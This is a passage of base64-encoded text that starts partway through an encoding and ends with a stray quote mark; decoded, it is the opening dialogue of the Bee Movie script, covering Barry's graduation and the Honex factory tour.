Fjay4gWWVsbG93LCBibGFjay4KT29oLCBibGFjayBhbmQgeWVsbG93IQpMZXQncyBzaGFrZSBpd
CB1cCBhIGxpdHRsZS4KQmFycnkhIEJyZWFrZmFzdCBpcyByZWFkeSEKQ29taW5nIQpIYW5nIG9uIG
Egc2Vjb25kLgpIZWxsbz8KQmFycnk/CkFkYW0/CkNhbiB5b3UgYmVsaWV2ZSB0aGlzIGlzIGhhcHB
lbmluZz8KSSBjYW4ndC4KSSdsbCBwaWNrIHlvdSB1cC4KTG9va2luZyBzaGFycC4KVXNlIHRoZSBzdG
FpcnMsIFlvdXIgZmF0aGVyIHBhaWQgZ29vZCBtb25leSBmb3IgdGhvc2UuClNvcnJ5LiBJJ20gZ
XhjaXRlZC4KSGVyZSdzIHRoZSBncmFkdWF0ZS4KV2UncmUgdmVyeSBwcm91ZCBvZiB5b3UsIHNv
bi4KQSBwZXJmZWN0IHJlcG9ydCBjYXJkLCBhbGwgQidzLgpWZXJ5IHByb3VkLgpNYSEgSSBn
b3QgYSB0aGluZyBnb2luZyBoZXJlLgpZb3UgZ290IGxpbnQgb24geW91ciBmdXp6LgpPdyEgV
GhhdCdzIG1lIQpXYXZlIHRvIHVzISBXZSdsbCBiZSBpbiByb3cgMTE4LDAwMC4KQnllIQpCY
XJyeSwgSSB0b2xkIHlvdSwgc3RvcCBmbHlpbmcgaW4gdGhlIGhvdXNlIQpIZXksIEFkYW0u
CkhleSwgQmFycnkuCklzIHRoYXQgZnV6eiBnZWw/CkEgbGl0dGxlLiBTcGVjaWFsIGRheSwgZ3
JhZHVhdGlvbi4KTmV2ZXIgdGhvdWdodCBJJ2QgbWFrZSBpdC4KVGhyZWUgZGF5cyBncmFkZSBzY2
hvb2wsIHRocmVlIGRheXMgaGlnaCBzY2hvb2wuClRob3NlIHdlcmUgYXdrd2FyZC4KVGhyZWUgZGF
5cyBjb2xsZWdlLiBJJ20gZ2xhZCBJIHRvb2sgYSBkYXkgYW5kIGhpdGNoaGlrZWQgYXJvdW5kIFRoZ
SBIaXZlLgpZb3UgZGlkIGNvbWUgYmFjayBkaWZmZXJlbnQuCkhpLCBCYXJyeS4gQXJ0aWUsIGdyb3dpb
mcgYSBtdXN0YWNoZT8gTG9va3MgZ29vZC4KSGVhciBhYm91dCBGcmFua2llPwpZZWFoLgpZb3UgZ29pb
mcgdG8gdGhlIGZ1bmVyYWw/Ck5vLCBJJ20gbm90IGdvaW5nLgpFdmVyeWJvZHkga25vd3MsIHN0aW5n
IHNvbWVvbmUsIHlvdSBkaWUuCkRvbid0IHdhc3RlIGl0IG9uIGEgc3F1aXJyZWwuClN1Y2ggYSBob3RoZW
FkLgpJIGd1ZXNzIGhlIGNvdWxkIGhhdmUganVzdCBnb3R0ZW4gb3V0IG9mIHRoZSB3YXkuCkkgbG92ZS
B0aGlzIGluY29ycG9yYXRpbmcgYW4gYW11c2VtZW50IHBhcmsgaW50byBvdXIgZGF5LgpUaGF0J3Mgd2
h5IHdlIGRvbid0IG5lZWQgdmFjYXRpb25zLgpCb3ksIHF1aXRlIGEgYml0IG9mIHBvbXAgdW5kZXIgdG
hlIGNpcmN1bXN0YW5jZXMuCldlbGwsIEFkYW0sIHRvZGF5IHdlIGFyZSBtZW4uCldlIGFyZSEKQmVlL
W1lbi4KQW1lbiEKSGFsbGVsdWphaCEKU3R1ZGVudHMsIGZhY3VsdHksIGRpc3Rpbmd1aXNoZWQgYmV
lcywKcGxlYXNlIHdlbGNvbWUgRGVhbiBCdXp6d2VsbC4KV2VsY29tZSwgTmV3IEhpdmUgQ2l0
eSBncmFkdWF0aW5nIGNsYXNzIG9mIDk6MTUuClRoYXQgY29uY2x1ZGVzIG91ciBjZXJlbW9u
aWVzIEFuZCBiZWdpbnMgeW91ciBjYXJlZXIgYXQgSG9uZXggSW5kdXN0cmllcyEKV2lsbCB3ZSBwa
WNrIG91ciBqb2IgdG9kYXk/CkkgaGVhcmQgaXQncyBqdXN0IG9yaWVudGF0aW9uLgpIZWFkcyB1cCEg
SGVyZSB3ZSBnby4KS2VlcCB5b3VyIGhhbmRzIGFuZCBhbnRlbm5hcyBpbnNpZGUgdGhlIHRyYW0gYXQgYWxsIHRpbWVzLgpXb25kZXIgd2hhdCBpdCdsbCBiZSBsaWtlPwpBIGxpdHRsZSBzY2FyeS4KV2VsY29tZSB0byBIb25leCwgYSBkaXZpc2lvbiBvZiBIb25lc2NvIGFuZCBhIHBhcnQgb2YgdGhlIEhleGFnb24gR3JvdXAuClRoaXMgaXMgaXQhCldvdy4KV293LgpXZSBrbm93IHRoYXQgeW91LCBhcyBhIGJlZSwgaGF2ZSB3b3JrZWQgeW91ciB3aG9sZSBsaWZlIHRvIGdldCB0byB0aGUgcG9pbnQgd2hlcmUgeW91IGNhbiB3b3JrIGZvciB5b3VyIHdob2xlIGxpZmUuCkhvbmV5IGJlZ2lucyB3aGVuIG91ciB2YWxpYW50IFBvbGxlbiBKb2NrcyBicmluZyB0aGUgbmVjdGFyIHRvIFRoZSBIaXZlLgpPdXIgdG9wLXNlY3JldCBmb3JtdWxhIGlzIGF1dG9tYXRpY2FsbHkgY29sb3ItY29ycmVjdGVkLCBzY2VudC1hZGp1c3RlZCBhbmQgYnViYmxlLWNvbnRvdXJlZCBpbnRvIHRoaXMgc29vdGhpbmcgc3dlZXQgc3lydXAgd2l0aCBpdHMgZGlzdGluY3RpdmUgZ29sZGVuIGdsb3cgeW91IGtub3cgYXMuLi4gSG9uZXkhClRoYXQgZ2lybCB3YXMgaG90LgpTaGUncyBteSBjb3VzaW4hClNoZSBpcz8KWWVzLCB3ZSdyZSBhbGwgY291c2lucy4KUmlnaHQuIFlvdSdyZSByaWdodC4KQXQgSG9uZXgsIHdlIGNvbnN0YW50bHkgc3RyaXZlIHRvIGltcHJvdmUgZXZlcnkgYXNwZWN0IG9mIGJlZSBleGlzdGVuY2UuClRoZXNlIGJlZXMgYXJlIHN0cmVzcy10ZXN0aW5nIGEgbmV3IGhlbG1ldCB0ZWNobm9sb2d5LgpXaGF0IGRvIHlvdSB0aGluayBoZSBtYWtlcz8KTm90IGVub3VnaC4KSGVyZSB3ZSBoYXZlIG91ciBsYXRlc3QgYWR2YW5jZW1lbnQsIHRoZSBLcmVsbWFuLgpXaGF0IGRvZXMgdGhhdCBkbz8KQ2F0Y2hlcyB0aGF0IGxpdHRsZSBzdHJhbmQgb2YgaG9uZXkgdGhhdCBoYW5ncyBhZnRlciB5b3UgcG91ciBpdC4KU2F2ZXMgdXMgbWlsbGlvbnMuCkNhbiBhbnlvbmUgd29yayBvbiB0aGUgS3JlbG1hbj8KT2YgY291cnNlLiBNb3N0IGJlZSBqb2JzIGFyZSBzbWFsbCBvbmVzLgpCdXQgYmVlcyBrbm93IHRoYXQgZXZlcnkgc21hbGwgam9iLCBpZiBpdCdzIGRvbmUgd2VsbCwgbWVhbnMgYSBsb3QuCkJ1dCBjaG9vc2UgY2FyZWZ1bGx5IGJlY2F1c2UgeW91J2xsIHN0YXkgaW4gdGhlIGpvYiB5b3UgcGljayBmb3IgdGhlIHJlc3Qgb2YgeW91ciBsaWZlLgpUaGUgc2FtZSBqb2IgdGhlIHJlc3Qgb2YgeW91ciBsaWZlPyBJIGRpZG4ndCBrbm93IHRoYXQuCldoYXQncyB0aGUgZGlmZmVyZW5jZT8KWW91J2xsIGJlIGhhcHB5IHRvIGtub3cgdGhhdCBiZWVzLCBhcyBhIHNwZWNpZXMsIGhhdmVuJ3QgaGFkIG9uZSBkYXkgb2ZmIGluIDI3IG1pbGxpb24geWVhcnMuClNvIHlvdSdsbCBqdXN0IHdvcmsgdXMgdG8gZGVhdGg/CldlJ2xsIHN1cmUgdHJ5LgpXb3chIFRoYXQgYmxldyBteSBtaW5kIQoiV2hhdCdzIHRoZSBkaWZmZXJlbmNlPyIKSG93IGNhbiB5b3Ugc2F5IHRoYXQ/Ck9uZSBqb2IgZm9yZXZlcj8KVGhhdCdzIGFuIGluc2FuZSBjaG9pY2UgdG8gaGF2ZSB0byBtYWtlLgpJJ20gcmVsaWV2ZWQuIE5vdyB3ZSBvbmx5IGhhdmUgdG8gbWFrZSBvbmUgZGVjaXNpb24gaW4gbGlmZS4KQnV0LCBBZGFtLCBob3cgY291bGQgdGhleSBuZXZlciBoYXZlIHRvbGQgdXMgdGhhdD8KV2h5IHdvdWxkIHlvdSBxdWVzdGlvbiBhbnl0aGluZz8gV2UncmUgYmVlcy4KV2UncmUgdGhlIG1vc3QgcGVyZmVjdGx5IGZ1bmN0aW9uaW5nIHNvY2lldHkgb24gRWFydGguCllvdSBldmVyIHRoaW5rIG1heWJlIHRoaW5ncyB3b3JrIGEgbGl0dGxlIHRvbyB3ZWxsIGhlcmU/
'
